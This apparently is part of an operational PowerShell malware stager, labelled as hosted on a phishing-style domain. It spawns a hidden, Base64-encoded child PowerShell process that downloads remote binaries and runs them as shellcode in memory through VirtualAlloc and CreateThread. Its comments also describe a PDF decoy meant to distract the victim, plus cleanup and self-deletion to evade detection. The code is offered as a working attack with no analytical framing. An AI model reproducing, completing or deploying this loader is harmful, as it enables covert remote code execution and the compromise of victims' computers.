# XenoR2 Payload v17-obs-SELFINJECT — Spawn Sacrificial + Self-Inject
# Placed on signindat.com as stage-obs-v2.ps1
# Parent: cleanup → self-delete → spawn child → exit
# Child: download .bin → VirtualAlloc → CreateThread → keep-alive

# === DIAGNOSTIC LOG ===
$log="$env:TEMP\wmisrv.log"
function log($m){ $ts=Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; "$ts | $m" | Out-File $log -Append -Encoding utf8 }
log "=== PAYLOAD START (v17-obs-SELFINJECT) ==="
...
# === STEP 5: CLEANUP (BEFORE spawn — parent dies clean) ===
...
# === STEP 6: PDF DECOY (before spawn — user sees it while payload loads) ===
...
# === STEP 7: SPAWN SACRIFICIAL CHILD (self-inject) ===
# Child script: downloads .bin → VirtualAlloc → CreateThread → keep-alive
# Parent dies immediately after spawn — child lives independently

$childScript=@"
`$log='$log'
function clog(`$m){ `$ts=Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; "`$ts | CHILD | `$m" | Out-File `$log -Append -Encoding utf8 }
clog 'Child spawned, pid='+`$pid

`$sources=@('$gh','$srv')
`$pulsarBin='$pulsarBin'
`$overlordBin='$overlordBin'
...
function _memExec(`$n,`$label){
    foreach(`$src in `$sources){
        `$url="`$src/`$n"
        try{
            clog "MEM: `$label from `$src"
            `$wc=New-Object Net.WebClient
            `$bytes=`$wc.DownloadData(`$url)
            if(`$bytes.Length -gt 0){
                clog "MEM: `$label downloaded `$(`$bytes.Length) bytes"
                `$mem=`$k32::VirtualAlloc(0,[uint32]`$bytes.Length,0x3000,0x40)
                if(`$mem -eq [IntPtr]::Zero){clog "MEM: `$label VirtualAlloc failed"; continue}
                [Runtime.InteropServices.Marshal]::Copy(`$bytes,0,`$mem,`$bytes.Length)
                `$thread=`$k32::CreateThread(0,0,`$mem,0,0,0)
                if(`$thread -eq [IntPtr]::Zero){clog "MEM: `$label CreateThread failed"; continue}
                clog "MEM: `$label thread=`$thread, executing"
                return `$true
            }
            clog "MEM: `$label zero bytes from `$src"
        }catch{clog "MEM: `$label fail from `$src : `$_"}
    }
    clog "MEM: `$label fail all sources"
    return `$false
}

clog 'Starting payloads'
`$r1=_memExec `$pulsarBin 'pulsar'
`$r2=_memExec `$overlordBin 'overlord'
clog "Payloads: pulsar=`$r1 overlord=`$r2"

# Keep child alive — shellcode threads depend on this process
clog 'KEEP-ALIVE: child staying alive'
while(`$true){ Start-Sleep 60 }
"@

# Encode child script as Base64 to avoid escaping hell
$childBytes=[Text.Encoding]::Unicode.GetBytes($childScript)
$childB64=[Convert]::ToBase64String($childBytes)

log "S8: spawning sacrificial child"
_cb 'S8' 'ok' 'spawning child'

# Spawn child powershell — hidden, no window, independent
Start-Process powershell.exe -ArgumentList "-ep bypass -w hidden -NoP -enc $childB64" -WindowStyle Hidden

log "S9: parent exiting — child lives on"
_cb 'S9' 'ok' 'parent exit, child alive'

# Parent dies — child keeps shellcode alive
exit 0
